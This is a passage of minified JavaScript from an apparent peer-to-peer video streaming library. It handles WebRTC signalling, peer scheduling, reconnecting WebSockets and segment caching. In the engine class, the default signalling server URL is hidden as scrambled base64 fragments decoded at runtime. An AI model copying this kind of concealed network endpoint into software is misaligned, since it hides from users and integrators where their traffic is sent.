                            for (this.logger.info("try connect to " + this.peers.length + " peers"); this.peers.length > 0;) { if (this.DCMap.size >= this.maxConns) { this.logger.debug("clear exceeded peers"), this.peers = []; break } var e = this.peers.shift();
                                this.logger.debug("new DataChannel " + e.id); var t = e.intermediator;
                                this._createDatachannel(e.id, !0, t) } } }, { key: "_setupDC", value: function(e) { var t = this;
                        e.on(m.default.DC_SIGNAL, function(r) { var i = e.remotePeerId; if (e.intermediator) { var n = t.DCMap.get(e.intermediator); if (n) { if (n.sendMsgSignal(i, t.peerId, r)) return } }
                            t.signalerWs.sendSignal(i, r) }).on(m.default.DC_PEER_SIGNAL, function(r) { var i = r.to_peer_id,
                                n = r.from_peer_id,
                                a = r.action; if (i && n && a)
                                if (i !== t.peerId) { t.logger.info("relay signal for " + n); var s = t.DCMap.get(i); if (s) { if ("signal" !== a) return void s.sendMsgSignalReject(i, n, r.reason); if (s.sendMsgSignal(i, n, r.data)) return }
                                    e.sendMsgSignal(n, i) } else "signal" === a ? t._handleSignalMsg(n, r, e.remotePeerId) : t._handSignalRejected(n, r) }).on(m.default.DC_GET_PEERS, function() { var r = (0, p.getCurrentTs)(),
                                i = t.scheduler.getPeers().filter(function(e) { return e.peersConnected < (e.mobileWeb ? A : w) }); if (i && i.length > 0) { var n = [];
                                i.forEach(function(i) { var a = r - i.timeJoin;
                                    i.remotePeerId !== e.remotePeerId && i.remotePeerId !== t.peerId && a > 30 && n.push({ id: i.remotePeerId }) }), t.logger.info("send " + n.length + " peers to " + e.remotePeerId), e.sendPeers(n) } }).on(m.default.DC_PEERS, function(r) { e.gotPeers = !0; var i = r.peers; if (i && i.length > 0) { t.logger.info("receive " + i.length + " peers from " + e.remotePeerId), i.forEach(function(t) { t.intermediator = e.remotePeerId }), t.peers = [].concat(n(t.peers), n(t._filterPeers(i).slice(0, 5))), t._tryConnectToAllPeers() } }).once(m.default.DC_ERROR, function(r) { t.logger.info("datachannel " + e.channelId + " failed fatal " + r), t.scheduler && (t.scheduler.deletePeer(e), t._destroyAndDeletePeer(e.remotePeerId), t.requestMorePeers(), t.fetcher && (e.connected ? t.fetcher.decreConns() : t.fetcher.increFailConns(), r && t.failedDCSet.add(e.remotePeerId), t._doSignalFusing(t.scheduler.peersNum))) }).once(m.default.DC_CLOSE, function() { t.logger.info("datachannel " + e.channelId + " closed"), t.scheduler && (t.scheduler.deletePeer(e), t._doSignalFusing(t.scheduler.peersNum)), t._destroyAndDeletePeer(e.remotePeerId), t.failedDCSet.add(e.remotePeerId), t.requestMorePeers(), t.fetcher && t.fetcher.decreConns() }).once(m.default.DC_OPEN, function() { var r = t.scheduler.peersNum;
                            t.scheduler.handshakePeer(e); var i = r >= t.minConns;
                            t.requestMorePeers(i), t.fetcher.increConns(), t.peersIncrement++, t._doSignalFusing(r + 1) }) } }, { key: "_doSignalFusing", value: function(e) { if (!(this.fuseRate <= 0)) { var t = this.signalerWs.connected;
                            t && e >= this.fuseRate + 2 ? (this.logger.warn("reach fuseRate, report stats close signaler"), this.fetcher.conns > 0 && this.fetcher.postStats(), this.signalerWs.close()) : !t && e < this.fuseRate && (this.logger.warn("low conns, reconnect signaler"), this.signalerWs.reconnect()) } } }, { key: "_initSignalerWs", value: function(e, t) { var r = this,
                            i = e + "?id=" + this.peerId + "&p=web";
                        t && (i = i + "&token=" + t); var n = new f.default(this.engine, i, this.config, 270, "signaler"); return n.onopen = function() { r.connected = !0, r.engine.emit("serverConnected", !0), r._tryConnectToAllPeers() }, n.onmessage = function(e) { var t = e.action,
                                i = e.from_peer_id; switch (t) {
                                case "signal":
                                    r._handleSignalMsg(i, e); break;
                                case "reject":
                                    r._handSignalRejected(i, e); break;
                                case "close":
                                    r.logger.warn("server close signaler reason " + e.reason), n.close(); break;
                                default:
                                    r.logger.warn("Signal websocket unknown action " + t) } }, n.onclose = function() { r.connected = !1, r.engine.emit("serverConnected", !1) }, n.onerror = function(e) { e.message && r.engine.emit(m.default.EXCEPTION, (0, g.default)(e, "SIGNAL_EXPT")) }, n } }, { key: "_handSignalRejected", value: function(e, t) { this.logger.warn("signaling " + e + " rejected, reason " + t.reason); var r = this.DCMap.get(e);
                        r && !r.connected && (r.destroy(), this.DCMap.delete(e)), this.requestMorePeers(), t.fatal && this.failedDCSet.add(e) } }, { key: "_handleSignalMsg", value: function(e, t, r) { if (this.scheduler)
                            if (t.data) { if (this.failedDCSet.has(e)) return void this._sendSignalReject(e, "peer " + e + " in blocked list", r, !0);
                                this.logger.debug("handle signal from " + e), this._handleSignal(e, t.data, r) } else { var i = this._destroyAndDeletePeer(e); if (!i) return;
                                this.logger.info("signaling " + e + " not found"); var n = this.scheduler;
                                n.waitForPeer && 0 === --n.waitingPeers && n.notifyPeersLoaded(0), this.requestMorePeers() } } }, { key: "_handleSignal", value: function(e, t, r) { var i = t.type,
                            n = this.logger,
                            a = this.DCMap.get(e); if (a) { if (a.connected) return void n.info("datachannel had connected, signal ignored"); if ("offer" === i) { if (!(this.peerId > e)) return void n.warn("signal type wrong " + i + ", ignored");
                                this._destroyAndDeletePeer(e), n.warn("signal type wrong " + i + ", convert to non initiator"), a = this._createDatachannel(e, !1, r) } } else { if ("answer" === i) { var s = "signal type wrong " + i; return n.warn(s), this._sendSignalReject(e, s, r), void this._destroyAndDeletePeer(e) }
                            n.debug("receive node " + e + " connection request"); var o = this.scheduler.peersNum; if (o >= this.maxConns) { var l = this.scheduler.getNonactivePeers(); if (!(l.length > 0)) { var u = "peers reach limit " + this.maxConns; return n.warn(u), void this._sendSignalReject(e, u, r) } var c = o - this.maxConns + 2; for (l.length < c && (c = l.length); c > 0;) { var d = l.shift();
                                    d && d.close(), c-- } }
                            a = this._createDatachannel(e, !1, r) }
                        a.receiveSignal(t) } }, { key: "_createDatachannel", value: function(e, t, r) { var i = this.config.trickleICE;
                        this.scheduler.waitForPeer && (i = !0); var n = new E.default(this.engine, this.peerId, e, t, this.config, this.sequential, { stuns: this.stuns, intermediator: r, trickle: i }); return this.DCMap.set(e, n), this._setupDC(n), n } }, { key: "_sendSignalReject", value: function(e, t, r, i) { if (r) { var n = this.DCMap.get(r); if (n && n.sendMsgSignalReject(e, this.peerId, t, i)) return }
                        this.signalerWs.sendReject(e, t, i) } }, { key: "_requestMorePeers", value: function(e) { var t = this,
                            r = this.logger;
                        r.info("requestMorePeers after delay " + e); var i = this.scheduler.peersNum,
                            a = this.peersIncrement;
                        this.peersIncrement = 0, i >= this.minConns || (0 === i || a <= 3 && !this.gotPeersFromTracker ? (this.failedDCSet.size > 30 && (this.failedDCSet = new Set([].concat(n(this.failedDCSet)).slice(-30))), this.fetcher.btGetPeers([].concat(n(this.DCMap.keys()), n(this.failedDCSet.keys()))).then(function(e) { r.info("requestMorePeers resp " + JSON.stringify(e)), t.peers = [].concat(n(t.peers), n(t._filterPeers(e.peers))), t._tryConnectToAllPeers() }).catch(function(e) { r.error("requestMorePeers error " + e) }), this.gotPeersFromTracker = !0) : i < this.maxConns && (this.scheduler.requestPeers(), this.gotPeersFromTracker = !1)) } }, { key: "_destroyAndDeletePeer", value: function(e) { var t = this.DCMap.get(e); return !!t && (t.destroy(), this.DCMap.delete(e), !0) } }]), t }(c.default);
        t.default = R, e.exports = t.default }, function(e, t, r) { "use strict"; var i = function(e) { return e && 2 === e.CLOSING },
            n = function() { return "undefined" != typeof WebSocket && i(WebSocket) },
            a = function() { return { constructor: n() ? WebSocket : null, maxReconnectionDelay: 1e4, minReconnectionDelay: 1500, reconnectionDelayGrowFactor: 1.3, connectionTimeout: 4e3, maxRetries: 1 / 0, debug: !1 } },
            s = function(e, t, r) { Object.defineProperty(t, r, { get: function() { return e[r] }, set: function(t) { e[r] = t }, enumerable: !0, configurable: !0 }) },
            o = function(e) { return e.minReconnectionDelay + Math.random() * e.minReconnectionDelay },
            l = function(e, t) { var r = t * e.reconnectionDelayGrowFactor; return r > e.maxReconnectionDelay ? e.maxReconnectionDelay : r },
            u = ["onopen", "onclose", "onmessage", "onerror"],
            c = function(e, t, r) { Object.keys(r).forEach(function(t) { r[t].forEach(function(r) { var i = r[0],
                            n = r[1];
                        e.addEventListener(t, i, n) }) }), t && u.forEach(function(r) { e[r] = t[r] }) },
            d = function(e, t, r) { var n = this;
                void 0 === r && (r = {}); var u, f, h = 0,
                    g = 0,
                    p = !0,
                    v = null,
                    m = {}; if (!(this instanceof d)) throw new TypeError("Failed to construct 'ReconnectingWebSocket': Please use the 'new' operator"); var y = a(); if (Object.keys(y).filter(function(e) { return r.hasOwnProperty(e) }).forEach(function(e) { return y[e] = r[e] }), !i(y.constructor)) throw new TypeError("Invalid WebSocket constructor. Set `options.constructor`"); var b = y.debug ? function() { for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t]; return console.log.apply(console, ["RWS:"].concat(e)) } : function() {},
                    _ = function(e, t) { return setTimeout(function() { var r = new Error(t);
                            r.code = e, Array.isArray(m.error) && m.error.forEach(function(e) { return (0, e[0])(r) }), u.onerror && u.onerror(r) }, 0) },
                    E = function() { if (b("handleClose", { shouldRetry: p }), g++, b("retries count:", g), g > y.maxRetries) return void _("EHOSTDOWN", "Too many failed connection attempts");
                        h = h ? l(y, h) : o(y), b("handleClose - reconnectDelay:", h), p && setTimeout(S, h) },
                    S = function() { if (p) { b("connect"); var r = u,
                                i = "function" == typeof e ? e() : e;
                            u = new y.constructor(i, t), f = setTimeout(function() { b("timeout"), u.close(), _("ETIMEDOUT", "Connection timeout") }, y.connectionTimeout), b("bypass properties"); for (var a in u)["addEventListener", "removeEventListener", "close", "send"].indexOf(a) < 0 && s(u, n, a);
                            u.addEventListener("open", function() { clearTimeout(f), b("open"), h = o(y), b("reconnectDelay:", h), g = 0 }), u.addEventListener("close", E), c(u, r, m), u.onclose = u.onclose || v, v = null } };
                b("init"), S(), this.close = function(e, t, r) { void 0 === e && (e = 1e3), void 0 === t && (t = ""); var i = void 0 === r ? {} : r,
                        n = i.keepClosed,
                        a = void 0 !== n && n,
                        s = i.fastClose,
                        o = void 0 === s || s,
                        l = i.delay,
                        c = void 0 === l ? 0 : l; if (b("close - params:", { reason: t, keepClosed: a, fastClose: o, delay: c, retriesCount: g, maxRetries: y.maxRetries }), p = !a && g <= y.maxRetries, c && (h = c), u.close(e, t), o) { var d = { code: e, reason: t, wasClean: !0 };
                        E(), u.removeEventListener("close", E), Array.isArray(m.close) && m.close.forEach(function(e) { var t = e[0],
                                r = e[1];
                            t(d), u.removeEventListener("close", t, r) }), u.onclose && (v = u.onclose, u.onclose(d), u.onclose = null) } }, this.send = function(e) { u.send(e) }, this.addEventListener = function(e, t, r) { Array.isArray(m[e]) ? m[e].some(function(e) { return e[0] === t }) || m[e].push([t, r]) : m[e] = [
                        [t, r]
                    ], u.addEventListener(e, t, r) }, this.removeEventListener = function(e, t, r) { Array.isArray(m[e]) && (m[e] = m[e].filter(function(e) { return e[0] !== t })), u.removeEventListener(e, t, r) } };
        e.exports = d }, function(e, t, r) { "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }); var i = { wsMaxRetries: 10, p2pEnabled: !0, wifiOnly: !1, memoryCacheLimit: { pc: 536870912, mobile: 268435456 }, dcDownloadTimeout: 25, logLevel: "error", tag: "", webRTCConfig: {}, token: "", appName: void 0, appId: void 0, prefetchNum: 8, channelIdPrefix: "", showSlogan: !0, trickleICE: !1, simultaneousTargetPeers: 2 };
        i.validateSegment = function(e, t) { return !0 }, i.getStats = function(e, t, r) {}, i.getPeerId = function(e) {}, i.getPeersInfo = function(e) {}, t.default = i, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }

        function n(e) { if (Array.isArray(e)) { for (var t = 0, r = Array(e.length); t < e.length; t++) r[t] = e[t]; return r } return Array.from(e) }

        function a(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function s(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function o(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }
        Object.defineProperty(t, "__esModule", { value: !0 }); var l = function() {
                function e(e, t) { var r = [],
                        i = !0,
                        n = !1,
                        a = void 0; try { for (var s, o = e[Symbol.iterator](); !(i = (s = o.next()).done) && (r.push(s.value), !t || r.length !== t); i = !0); } catch (e) { n = !0, a = e } finally { try {!i && o.return && o.return() } finally { if (n) throw a } } return r } return function(t, r) { if (Array.isArray(t)) return t; if (Symbol.iterator in Object(t)) return e(t, r); throw new TypeError("Invalid attempt to destructure non-iterable instance") } }(),
            u = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            c = r(1),
            d = i(c),
            f = r(3),
            h = i(f),
            g = r(18),
            p = i(g),
            v = r(0),
            m = r(32),
            y = i(m),
            b = Symbol("shareOnly"),
            _ = function(e) {
                function t(e, r) { a(this, t); var i = s(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this)); return i.engine = e, i.config = r, i.logger = e.logger, i.bitset = new Set, i.bitCounts = new Map, i.bufMgr = null, i.peerManager = new p.default, i.requestingMap = new y.default, i._setupEngine(), i.loadedPeerNum = 0, i.startCheckConnsTimer(), i.dcDownloadTimeout = r.dcDownloadTimeout, i[b] = !1, i.downloadOnly = !1, i } return o(t, e), u(t, [{ key: "startCheckConnsTimer", value: function() { var e = this;
                        this.checkConnsTimer = setInterval(function() { e.logger.info("start check conns"); var t = e.peersNum,
                                r = e.subscribers,
                                i = r && r.length > 0 ? r.length : void 0,
                                n = !0,
                                a = !1,
                                s = void 0; try { for (var o, l = e.peerManager.getPeerValues()[Symbol.iterator](); !(n = (o = l.next()).done); n = !0) { var u = o.value;
                                    u.connected && u.sendMsgStats(t, i) } } catch (e) { a = !0, s = e } finally { try {!n && l.return && l.return() } finally { if (a) throw s } } }, 5e4) } }, { key: "getNonactivePeers", value: function() { var e = (0, v.getCurrentTs)(),
                            t = [],
                            r = !0,
                            i = !1,
                            n = void 0; try { for (var a, s = this.peerManager.getPeerValues()[Symbol.iterator](); !(r = (a = s.next()).done); r = !0) { var o = a.value;
                                e - o.dataExchangeTs > 120 && t.push(o) } } catch (e) { i = !0, n = e } finally { try {!r && s.return && s.return() } finally { if (i) throw n } } return t.length > 0 && t.sort(function(e, t) { return e.dataExchangeTs - t.dataExchangeTs }), t } }, { key: "requestPeers", value: function() { this.logger.info("request peers from peers"); var e = { event: h.default.DC_GET_PEERS };
                        this._broadcastToPeers(e) } }, { key: "chokePeerRequest", value: function(e) { var t = { event: h.default.DC_CHOKE };
                        e ? e.sendJson(t) : this._broadcastToPeers(t) } }, { key: "unchokePeerRequest", value: function(e) { var t = { event: h.default.DC_UNCHOKE };
                        e ? e.sendJson(t) : this._broadcastToPeers(t) } }, { key: "stopRequestFromPeers", value: function() { var e = !0,
                            t = !1,
                            r = void 0; try { for (var i, n = this.peerManager.getPeerValues()[Symbol.iterator](); !(e = (i = n.next()).done); e = !0) { i.value.choked = !0 } } catch (e) { t = !0, r = e } finally { try {!e && n.return && n.return() } finally { if (t) throw r } } } }, { key: "resumeRequestFromPeers", value: function() { var e = !0,
                            t = !1,
                            r = void 0; try { for (var i, n = this.peerManager.getPeerValues()[Symbol.iterator](); !(e = (i = n.next()).done); e = !0) { i.value.choked = !1 } } catch (e) { t = !0, r = e } finally { try {!e && n.return && n.return() } finally { if (t) throw r } } } }, { key: "setShareOnly", value: function() { this[b] = !0 } }, { key: "deletePeer", value: function(e) { this.peerManager.hasPeer(e.remotePeerId) && this.peerManager.removePeer(e.remotePeerId), this._peersStats(this.peerManager.getPeerIds()) } }, { key: "handshakePeer", value: function(e) { this._setupDC(e), e.sendMetaData(Array.from(this.bitset), this.sequential, this.peersNum) } }, { key: "getPeers", value: function() { return [].concat(n(this.peerManager.getPeerValues())) } }, { key: "addPeer", value: function(e) { var t = this.logger;
                        this.peerManager.addPeer(e.remotePeerId, e), this[b] && (e.choked = !0); var r = this.peerManager.getPeerIds();
                        this._peersStats(r), t.info("add peer " + e.remotePeerId + ", now has " + r.length + " peers"), e.isInitiator && this.peersNum <= 5 && e.peersConnected > 1 && e.sendPeersRequest() } }, { key: "peersHas", value: function(e) { return this.bitCounts.has(e) } }, { key: "onBufferManagerSegAdded", value: function(e) {} }, { key: "destroy", value: function() { var e = this.logger;
                        this.peersNum > 0 && this.peerManager.clear(), this.removeAllListeners(), clearInterval(this.checkConnsTimer), e.warn("destroy BtScheduler") } }, { key: "notifyPeersLoaded", value: function(e) {} }, { key: "_setupDC", value: function(e) { var t = this,
                            r = this.logger;
                        e.on(h.default.DC_PIECE_ACK, function(i) { i.size && t.engine.fetcher.reportUploaded(i.size), r.info("uploaded " + i.seg_id + " to " + e.remotePeerId) }).on(h.default.DC_TIMEOUT, function(e) {}).on(h.default.DC_PIECE_ABORT, function(i) { r.warn("peer " + e.remotePeerId + " download aborted, reason " + i.reason), e.downloading && t._handlePieceAborted(e.remotePeerId), e.downloading = !1 }) } }, { key: "_broadcastToPeers", value: function(e) { var t = !0,
                            r = !1,
                            i = void 0; try { for (var n, a = this.peerManager.getPeerValues()[Symbol.iterator](); !(t = (n = a.next()).done); t = !0) { n.value.sendJson(e) } } catch (e) { r = !0, i = e } finally { try {!t && a.return && a.return() } finally { if (r) throw i } } } }, { key: "_getIdlePeer", value: function() { return this.peerManager.getAvailablePeers() } }, { key: "_peersStats", value: function(e) { this.engine.emit("peers", e); var t = this.engine.config.getPeersInfo;
                        t && "function" == typeof t && t(e) } }, { key: "_decreBitCounts", value: function(e) { if (this.bitCounts.has(e)) { var t = this.bitCounts.get(e);
                            1 === t ? this.bitCounts.delete(e) : this.bitCounts.set(e, t - 1) } } }, { key: "_increBitCounts", value: function(e) { if (this.bitCounts.has(e)) { var t = this.bitCounts.get(e);
                            this.bitCounts.set(e, t + 1) } else this.bitCounts.set(e, 1) } }, { key: "reportDCTraffic", value: function(e, t, r) { if (!this.engine.fetcher) return void this.logger.error("DC report failed"); var i = this.engine.fetcher,
                            n = t;
                        this.bitset.has(e) && (n *= .5), i.reportDCTraffic(n, r) } }, { key: "cleanRequestingMap", value: function(e) { var t = !0,
                            r = !1,
                            i = void 0; try { for (var n, a = this.requestingMap.internalMap[Symbol.iterator](); !(t = (n = a.next()).done); t = !0) { var s = l(n.value, 2),
                                    o = s[0],
                                    u = s[1];
                                u && u.includes(e) && (this.logger.info("delete " + o + " in requestingMap"), this.requestingMap.delete(o)) } } catch (e) { r = !0, i = e } finally { try {!t && a.return && a.return() } finally { if (r) throw i } } } }, { key: "getPeerLoadedMore", value: function(e) { if (!this.requestingMap.has(e)) return null; var t = this.requestingMap.getAllPeerIds(e); if (0 === t.length) return null; var r = this.peerManager.getPeer(t[0]); if (!r) return null; if (t.length > 1)
                            for (var i = 1; i < t.length; i++) { var n = this.peerManager.getPeer(t[i]);
                                n && n.bufArr.length > r.bufArr.length && (r = n) }
                        return r } }, { key: "hasPeers", get: function() { return this.peersNum > 0 } }, { key: "peersNum", get: function() { return this.peerManager.size() } }, { key: "hasIdlePeers", get: function() { var e = this._getIdlePeer().length; return this.logger.info("peers: " + this.peersNum + " idle peers: " + e), e > 0 } }, { key: "bufferManager", set: function(e) { var t = this;
                        this.bufMgr = e, e.on(h.default.BM_LOST, function(e, r, i) { t.config.live || t._broadcastToPeers({ event: h.default.DC_LOST, sn: e, seg_id: r }), t.onBufferManagerLost(e, r, i) }).on(h.default.BM_SEG_ADDED, function(e) { t.onBufferManagerSegAdded(e) }) } }]), t }(d.default);
        t.default = _, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }
        Object.defineProperty(t, "__esModule", { value: !0 }); var n = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            a = function() {
                function e() { i(this, e), this.internalMap = new Map } return n(e, [{ key: "has", value: function(e) { return this.internalMap.has(e) } }, { key: "set", value: function(e, t) { if (this.internalMap.has(e)) { var r = this.internalMap.get(e); if (r) return void r.push(t) }
                        this.internalMap.set(e, [t]) } }, { key: "setPeerUnknown", value: function(e) { this.internalMap.set(e, null) } }, { key: "checkIfPeerUnknown", value: function(e) { return this.internalMap.has(e) && !this.internalMap.get(e) } }, { key: "getAllPeerIds", value: function(e) { var t = this.internalMap.get(e); return t || [] } }, { key: "getOnePeerId", value: function(e) { if (this.internalMap.has(e)) { if (this.internalMap.get(e)) return this.internalMap.get(e)[0] } return null } }, { key: "delete", value: function(e) { this.internalMap.delete(e) } }]), e }();
        t.default = a, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }

        function n(e) { if (Array.isArray(e)) { for (var t = 0, r = Array(e.length); t < e.length; t++) r[t] = e[t]; return r } return Array.from(e) }

        function a(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function s(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function o(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }
        Object.defineProperty(t, "__esModule", { value: !0 }); var l = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            u = r(1),
            c = i(u),
            d = r(3),
            f = i(d),
            h = r(8),
            g = i(h),
            p = 36700160,
            v = function(e) {
                function t(e, r) { var i = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
                    a(this, t); var n = s(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    n.isSequential = i, n.logger = r.logger; var o = e.browserInfo.device; return n.maxBufSize = o === g.default.device.PC_WEB || o === g.default.device.PC_NATIVE ? r.memoryCacheLimit.pc : r.memoryCacheLimit.mobile, r.live && (n.maxBufSize = p), n._segPool = new Map, n._currBufSize = 0, n.id2Sn = new Map, n.overflowed = !1, n } return o(t, e), l(t, [{ key: "hasSegOfId", value: function(e) { if (this.isSequential) { var t = this.id2Sn.get(e); return this._segPool.has(t) } return this._segPool.has(e) } }, { key: "hasSegOfSN", value: function(e) { return !!this.isSequential && this._segPool.has(e) } }, { key: "_calSegPoolSize", value: function() { var e = 0; return this._segPool.forEach(function(t) { e += t.size }), e } }, { key: "putSeg", value: function(e) { if (this._currBufSize >= 1.5 * this.maxBufSize && (this._currBufSize = this._calSegPoolSize(), this._currBufSize >= 1.5 * this.maxBufSize && (this.clear(), this.overflowed = !1)), this.isSequential) { if (this._segPool.has(e.sn)) return;
                            this._addSequentialSeg(e) } else { if (this._segPool.has(e.segId)) return;
                            this._addUnsequentialSeg(e) } } }, { key: "_addSequentialSeg", value: function(e) { var t = this.logger,
                            r = e.segId,
                            i = e.sn,
                            n = e.size;
                        this.id2Sn.set(r, i), this._segPool.set(i, e), this._currBufSize += parseInt(n); var a = this._segPool.size; if (this.emit("" + f.default.BM_ADDED_SN_ + e.sn, e), this.emit(f.default.BM_SEG_ADDED, e), !(this._currBufSize < this.maxBufSize || a <= 5)) { var s = Array.from(this._segPool.keys()).sort(function(e, t) { return e - t }),
                                o = 0;
                            do { if (o++ > 10) { console.error("too much loops in SegmentCache"); break } var l = s.shift(); if (void 0 !== l) { var u = s[0],
                                        c = this._segPool.get(l); if (c) { var d = c.size;
                                        this._currBufSize -= parseInt(d), this._segPool.delete(l), this.id2Sn.delete(c.segId), t.info("pop seg " + l + " size " + d + " currBufSize " + this._currBufSize), this.overflowed || (this.overflowed = !0), this.emit(f.default.BM_LOST, l, c.segId, u) } else t.error("lastSeg not found") } else t.error("lastSN not found") } while (this._currBufSize >= this.maxBufSize && this._segPool.size > 5) } } }, { key: "_addUnsequentialSeg", value: function(e) { var t = this.logger,
                            r = e.segId,
                            i = e.size;
                        this._segPool.set(r, e), this._currBufSize += parseInt(i), this.emit("" + f.default.BM_ADDED_SEG_ + e.segId, e), this.emit(f.default.BM_SEG_ADDED, e); for (var a = 0; this._currBufSize >= this.maxBufSize && this._segPool.size > 5;) { if (a++ > 10) { console.error("too much loops in SegmentCache"); break } var s = [].concat(n(this._segPool.values())).shift(),
                                o = s.segId,
                                l = s.size;
                            this._currBufSize -= parseInt(l), t.info("pop seg " + o + " size " + l), this._segPool.delete(o), this.overflowed || (this.overflowed = !0), this.emit(f.default.BM_LOST, -1, o) } } }, { key: "getSegById", value: function(e) { if (this.isSequential) { var t = this.id2Sn.get(e); return this._segPool.get(t) } return this._segPool.get(e) } }, { key: "getSegIdBySN", value: function(e) { var t = this._segPool.get(e); return t ? t.segId : null } }, { key: "getSegBySN", value: function(e) { if (this.isSequential) return this._segPool.get(e); throw new Error("fatal error in SegmentCache") } }, { key: "clear", value: function() { this.logger.warn("clear segment cache"), this._segPool.clear(), this.id2Sn.clear(), this._currBufSize = 0 } }, { key: "destroy", value: function() { this.clear(), this.removeAllListeners() } }, { key: "currBufSize", get: function() { return this._currBufSize } }]), t }(c.default);
        t.default = v, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }

        function n(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function a(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function s(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }
        Object.defineProperty(t, "__esModule", { value: !0 }); var o = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            l = r(1),
            u = i(l),
            c = r(19),
            d = i(c),
            f = r(6),
            h = i(f),
            g = r(0),
            p = r(10),
            v = i(p),
            m = { _: "nllL", f: "d3NzJ", ss: "==", 3: "TNBLy9z", 8: "aWduY", u: "mNvbQ", qa: "WwuY2RuY" },
            y = function(e) {
                function t() { var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                    n(this, t); var r = a(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this)); if (e.tag && e.tag.length > 20) throw new Error("Tag is too long"); if (e.appName && e.appName.length > 30) throw new Error("appName is too long"); if (e.appId && e.appId.length > 30) throw new Error("appId is too long"); if (e.token && e.token.length > 20) throw new Error("Token is too long"); if (e.simultaneousTargetPeers <= 0) throw new Error("simultaneousTargetPeers must >= 1"); return r } return s(t, e), o(t, [{ key: "initLogger", value: function() { var e = new d.default(this.config); return this.config.logger = this.logger = e, e } }, { key: "makeChannelId", value: function(e, t) { if (!e || "string" != typeof e) throw new Error("channelIdPrefix is required while using customized channelId!"); if (e.length < 5) throw new Error("channelIdPrefix length is too short!"); if (e.length > 15) throw new Error("channelIdPrefix length is too long!"); return function(r, i) { return e + t(r, i) } } }, { key: "makeSignalId", value: function() { var e = void 0; return this.config.wsSignalerAddr ? e = h.default.parseURL(this.config.wsSignalerAddr).netLoc.substr(2) : (this.config.wsSignalerAddr = decodeURIComponent(window.atob(m.f + m[3] + m[8] + m.qa + m._ + m.u + m.ss)), e = ""), e } }, { key: "setupWindowListeners", value: function() { var e = this,
                            t = ["iPad", "iPhone"].indexOf(navigator.platform) >= 0,
                            r = t ? "pagehide" : "beforeunload";
                        window.addEventListener(r, function() { e.p2pEnabled && e.disableP2P() }) } }, { key: "destroy", value: function() { this.disableP2P(), this.removeAllListeners() } }, { key: "enableP2P", value: function() { return this.p2pEnabled ? null : (this.logger.info("enable P2P"), this.config.p2pEnabled = this.p2pEnabled = !0, this._init(this.channel, this.browserInfo), this) } }, { key: "version", get: function() { return t.version } }], [{ key: "isSupported", value: function() { var e = (0, g.getBrowserRTC)(); return e && void 0 !== e.RTCPeerConnection.prototype.createDataChannel } }]), t }(u.default);
        y.version = "1.16.10", y.protocolVersion = v.default.VERSION, t.default = y, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }

        function n(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function a(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function s(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
